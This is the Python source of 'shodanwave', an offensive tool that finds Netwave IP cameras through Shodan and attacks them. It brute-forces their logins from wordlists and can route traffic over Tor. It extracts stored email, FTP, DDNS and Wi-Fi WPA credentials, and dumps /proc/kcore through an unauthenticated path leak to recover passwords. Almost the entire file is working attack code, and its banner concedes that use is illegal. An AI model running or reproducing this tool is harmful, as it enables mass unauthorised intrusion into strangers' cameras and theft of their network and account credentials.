#!/usr/bin/python2.7

# -*- coding: utf-8 -*-

import argparse
import sys,os,time
import subprocess
import signal
from threading import Thread
import random

try:

 import shodan
 import requests
 from pyfiglet import Figlet
 import tailer

except ImportError as e:
    print("Error: %s \n" % (e))
    print("Try this ... pip install -r /path/to/requirements.txt")


class backgroundColor:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def main() :

 Graph = Figlet(font='slant')
 GraphRender = Graph.renderText('shodanwave')

 print("%s" % (backgroundColor.WARNING + GraphRender + backgroundColor.ENDC))
 print(backgroundColor.FAIL + "\rThis tool is successfully connected to shodan service\nInformation the use of this tool is illegal, not bad.\n" + backgroundColor.ENDC)

 parser = argparse.ArgumentParser()
 parser.add_argument('-s','--search', dest='search', default='Netwave IP Camera', type=str, help='Default Netwave IP Camera')
 parser.add_argument('-u','--username', dest="username",  type=file, help='Select your usernames wordlist')
 parser.add_argument('-w','--wordlist', dest="password",  type=file, help='Select your passwords wordlist')
 parser.add_argument('-k','--shodan', dest="address", default='', type=str, help='Shodan API key')
 parser.add_argument('-t','--output', dest="output", default='', type=str, help='Log File')
 parser.add_argument('-l','--limit', dest="limit", type=str, help='Limit the number of registers responsed by Shodan')
 parser.add_argument('-o','--offset', dest="offset", type=str, help='Shodan skips this number of registers from response')
 parser.add_argument('-p','--tor', dest="tor", action='store_true', help='Add Tor Functionality, modify your tsocks config')
 args = parser.parse_args()
 
 global filename
 filename = args.output

 try:

  if sys.argv[2] == "-h" or sys.argv[2] == "--help":
   # print "Usage: python shodanwave.py --help"
   sys.exit(0)
 except Exception as e:
   print "Usage: python shodanwave.py --help"
   sys.exit(0)

 def signal_handler(signal, frame):
  print('\nclearing up..')
  os.system("rm -rf tmpstream.txt")
  os.system("rm -rf tmpstrings.out")
  os.system("killall -9 wget")
  os.system("killall -9 tail")
  sys.exit(0)


 signal.signal(signal.SIGINT, signal_handler)

 def NetworkSearchosts():
  
  exploit = True
  found = False

  macaddr = ""
  email_user = ''
  email_pwd = ''

  ftp_user = ''
  ftp_pwd = ''
  ftp_svr = ''
  ftp_port = ''

  ddns_user= ''
  ddns_pwd= ''
  ddns_host = ''
  ddns_proxy_svr = ''

  msn_user = ''
  msn_pwd = ''

  global tor_toggle
  tor_toggle = False

  #FNULL = open(os.devnull, 'w')

  try:

   shodanapi = shodan.Shodan(args.address)
   api = shodanapi.search(args.search, limit = args.limit, offset = args.offset)
   total = api.get('total')

   print(backgroundColor.OKGREEN + "[+] Shodan successfully Connected."+ backgroundColor.ENDC)
   print(backgroundColor.OKGREEN + "[+] Netwave Exploit Enabled."+ backgroundColor.ENDC)
   print(backgroundColor.OKGREEN + "[+] Netwave IP Camera Found: %d" % (total) + backgroundColor.ENDC)

   if args.username or args.password :
      usernames = args.username.readlines()
      passwords = args.password.readlines()

      print(backgroundColor.OKGREEN + "[+] Passwords loaded: %d" % (len(passwords)) + backgroundColor.ENDC)
      pass
   
   if args.tor == True :
      tor_toggle = True
      check_tor_status = subprocess.Popen(['whereis', 'tor'],shell=False, stdout=subprocess.PIPE)
      check_tor_status = check_tor_status.stdout.read().decode('utf-8')
      check_tsocks_status = subprocess.Popen(['whereis', 'tsocks'],shell=False, stdout=subprocess.PIPE)
      check_tsocks_status = check_tsocks_status.stdout.read().decode('utf-8')
      if ('/usr/bin/tor' not in check_tor_status) or ('/usr/sbin/tor' not in check_tor_status) :
         print(backgroundColor.WARNING + "Please Install Tor: apt-get install tor"+ backgroundColor.ENDC)
         sys.exit()
      if ('/usr/bin/tsocks' not in check_tsocks_status) :
          print(backgroundColor.WARNING + "ShodanWave uses Tsocks for wget, pleae install and configure Tsocks: apt-get install tsocks"+ backgroundColor.ENDC)
          sys.exit()
      if 'inactive' in check_tor_status :
         enable_tor = subprocess.Popen(['service tor start'],shell=False, stdout=subprocess.PIPE)
         print(backgroundColor.WARNING + "Tor was Disabled, Enabling it now."+ backgroundColor.ENDC) 

   ShodanModuleExploit = raw_input(backgroundColor.WARNING + "[!] Disable password discovery module? (Yes/no): " + backgroundColor.ENDC)

   if ShodanModuleExploit.upper() == "YES" or ShodanModuleExploit.upper() == "Y":
      print(backgroundColor.FAIL + "[-] Netwave exploit disabled." + backgroundColor.ENDC)
      exploit = False

   while True:

    for hosts in api['matches'] :

     host = hosts.get('ip_str')
     port = hosts.get('port')
     city = hosts['location']['city'] or 'n/a'
     country = hosts['location']['country_name'] or 'n/a'
     org = hosts.get('org', 'n/a')
     hostnames = hosts.get('hostnames', 'n/a')
     product = hosts.get('product', 'n/a')

     try:

      path = "snapshot.cgi"
      url = "http://%s:%s/%s" % (host, port, path)

      print("[+] Launching brute force on host http://%s:%s" % (host, port))
      for administrator in usernames :
       administrator = administrator.strip()
       for password in passwords:

        password = password.strip()
        if tor_toggle == True :
           proxies = {'http': 'socks5://127.0.0.1:9050'}
        
        headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
        
        if toggle_tor == True :
           request = requests.get(url, auth=(administrator, password), headers=headers, proxies=proxies, timeout=1)
        else :
           request = requests.get(url, auth=(administrator, password), headers=headers, timeout=0.3)

        status = request.status_code

        if status == 200:

         exploit = False
         found = True

         print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[+] Password Found %s@%s" % (administrator, password) + backgroundColor.ENDC)
         print(backgroundColor.WARNING + "[!] Trying to get more information" + backgroundColor.ENDC)

         try:

             url = "http://%s:%s/get_params.cgi" % (host, port)

             headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
             if tor_toggle == True : 
                request = requests.get(url, headers=headers, auth=(administrator, password), proxies=proxies, timeout=1)
             else:
                request = requests.get(url, headers=headers, auth=(administrator, password), timeout=0.3)

             response = request.text.split(";\n")

             if status == 200:
                 for content in response :
                     if content.startswith("var mail_user="):
                         content = content.split("'")
                         email_user = content[1]
                     elif content.startswith("var mail_pwd="):
                         content = content.split("'")
                         email_pwd = content[1]
                     elif content.startswith("var ddns_user="):
                         content = content.split("'")
                         ddns_user = content[1]
                     elif content.startswith("var ddns_pwd="):
                         content = content.split("'")
                         ddns_pwd = content[1]
                     elif content.startswith("var ddns_host="):
                         content = content.split("'")
                         ddns_host = content[1]
                     elif content.startswith("var ddns_proxy_svr="):
                         content = content.split("'")
                         ddns_proxy_svr = content[1]
                     elif content.startswith("var ftp_svr="):
                         content = content.split("'")
                         ftp_svr = content[1]
                     elif content.startswith("var ftp_port="):
                         content = content.split("=")
                         ftp_port = content[1]
                     elif content.startswith("var ftp_user="):
                         content = content.split("'")
                         ftp_user = content[1]
                     elif content.startswith("var ftp_pwd="):
                         content = content.split("'")
                         ftp_pwd = content[1]
                     elif content.startswith("var msn_user="):
                         content = content.split("'")
                         msn_user = content[1]
                     elif content.startswith("var msn_pwd="):
                         content = content.split("'")
                         msn_pwd = content[1]
                 if not(email_user == ''):
                     print(backgroundColor.OKGREEN + "[+] Email: %s:%s" % (email_user, email_pwd) + backgroundColor.ENDC)
                 if not(ftp_user == ''):
                     print(backgroundColor.OKGREEN + "[+] FTP: ftp://%s:%s@%s:%s" % (ftp_user, ftp_pwd, ftp_svr, ftp_port) + backgroundColor.ENDC)
                 if not(ddns_user == ''):
                     print(backgroundColor.OKGREEN + "[+] DNS: http://%s:%s@%s:%s" % (ddns_user, ddns_pwd, ddns_host, ddns_proxy_svr) + backgroundColor.ENDC)
                 if not(msn_user == '') :
                     print( backgroundColor.OKGREEN + "[+] MSN: %s@%s" % (msn_user, msn_pwd) + backgroundColor.ENDC)
         except Exception as e:
             print(backgroundColor.FAIL + "[-] %s not found " % url + backgroundColor.ENDC)
         break
        else:
         found = False
         if ShodanModuleExploit.upper() == "YES" or ShodanModuleExploit.upper() == "Y":
           exploit = False
         else:
          exploit = True

      if not(found):
       if ShodanModuleExploit.upper() == "YES" or ShodanModuleExploit.upper() == "Y":
          exploit = False
       else:
        exploit = True
        print(backgroundColor.FAIL + backgroundColor.BOLD + "[!] Password not found" + backgroundColor.ENDC)
     except Exception as e:
      print(backgroundColor.FAIL + "[-] %s not found" % url + backgroundColor.ENDC)

     print(backgroundColor.WARNING + "[!] Getting System Information" + backgroundColor.ENDC)
     print(backgroundColor.WARNING + "[!] Getting Wireless System Information" +backgroundColor.ENDC)

     try:

      wireless = "http://%s:%s/get_status.cgi" % (host, port)
      headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }

      if tor_toggle == True :
         response = requests.get(wireless, headers=headers, proxies=proxies, timeout=1)
      else :
         response = requests.get(wireless, headers=headers, timeout=0.3)

      status = response.status_code
      content = response.text.split(';\n')

      if status == 200:
       for macaddress in content:
        if macaddress.startswith("var id="):
         macaddress = macaddress.split("'")
         macaddr = macaddress[1]

         print(backgroundColor.WARNING + "[+] Mac address found %s" % (macaddr) + backgroundColor.ENDC)

      else:
        print(backgroundColor.FAIL + "[-] Getting mac address" + backgroundColor.ENDC)
     except Exception as e:
      print(backgroundColor.FAIL + "[-] %s not found" %  wireless + backgroundColor.ENDC)

     print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, city, org, product))

     log(host, port, country, city, org, product)

     try:

      url = "http://%s:%s//etc/RT2870STA.dat" % (host, port)

      headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.94 Safari/537.36" }
      if tor_toggle == True :
         response = requests.get(url, headers=headers, proxies=proxies, timeout=1)
      else :
         response = requests.get(url, headers=headers, timeout=0.3)

      content = response.text.split("\n")

      status = response.status_code

      if status == 200:
       for crendential in content :
         if crendential.find("WPAPSK") != -1 or crendential.find("SSID") != -1  :
            crendential = crendential.replace("=", ": ")
            print(backgroundColor.OKGREEN + backgroundColor.BOLD + "[+] %s" % crendential + backgroundColor.ENDC)
      else:
       print(backgroundColor.FAIL + backgroundColor.BOLD + "[!] Wireless lan is disabled.."+ backgroundColor.ENDC)
     except Exception as e:
      print(backgroundColor.FAIL + "[!] Error: Wireless lan is disabled.." + backgroundColor.ENDC)

     try:

      url = "http://%s:%s//proc/kcore" % (host, port)
      done = 0
      linecount = 0

      if exploit:

       print (backgroundColor.FAIL +"[+] Starting to read memory dump.. this could take a few minutes"+backgroundColor.ENDC)
       if tor_toggle == True :
          proc = subprocess.Popen("tsocks wget -qO- "+ url +" >> tmpstream.txt", shell=True, preexec_fn=os.setsid)
       else :
          proc = subprocess.Popen("wget -qO- "+ url +" >> tmpstream.txt", shell=True, preexec_fn=os.setsid)
       os.system('echo "" > tmpstrings.out')
       time.sleep(1)
       proc2 = subprocess.Popen("tail -f tmpstream.txt | strings >>tmpstrings.out", shell=True, preexec_fn=os.setsid)
       print (backgroundColor.BOLD+"[+] CTRL+C to exit.."+ backgroundColor.ENDC)

       while 1:
          sys.stdout.flush()
          if os.stat('tmpstrings.out').st_size <= 1024:
           sys.stdout.write(backgroundColor.OKGREEN + "binary data: "+str(os.stat('tmpstream.txt').st_size)+"\r" + backgroundColor.ENDC)
          else:
            sys.stdout.flush()
            print "[+] Strings in binary data found.. password should be around line 10000"
            for line in tailer.follow(open('tmpstrings.out','r')):
              if done == 0:
                linecount+= 1
                if line == macaddr:
                  sys.stdout.flush()
                  done = 1
                  print (backgroundColor.OKGREEN+"[+] Mac address triggered.. printing the following dumps, could leak username and passwords.."+backgroundColor.ENDC)
                else:
                  sys.stdout.write(str(linecount)+"\r")
              elif done == 1:
                done = 2
                print "[+] Firstline.. "+ backgroundColor.OKGREEN+line+backgroundColor.ENDC
              elif done == 2:
                done = 3
                print "[+] Possible username: "+backgroundColor.OKGREEN+line+backgroundColor.ENDC
              elif done == 3:
                done = 4
                print "[+] Possible password: "+backgroundColor.OKGREEN+line+backgroundColor.ENDC
              elif done == 4:
                done = 0
                print "[+] Following line.. \n\n"+backgroundColor.OKGREEN+line+backgroundColor.ENDC
              else:
                pass
       signal.pause()
     except:
      print (backgroundColor.FAIL+"[-] Victim isnt vulnerable for a memory leak, exiting.."+backgroundColor.ENDC)
    print(backgroundColor.OKGREEN + "[+] Done!" + backgroundColor.ENDC)
    return True
  except shodan.APIError as e:
   print(backgroundColor.FAIL + "[-] Error: %s" % (e) + backgroundColor.ENDC)
   sys.exit(0)

 NetworkSearchosts()



def log(host, port, country, city, org, product):
 if filename != '' :
    file = open(filename, 'a')
    out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n " % (host, port, country, city, org, product)
    file.write(out.encode('utf-8'))
    file.write("*****************" + "\n")
    file.close()



if __name__ == "__main__" :
 main()
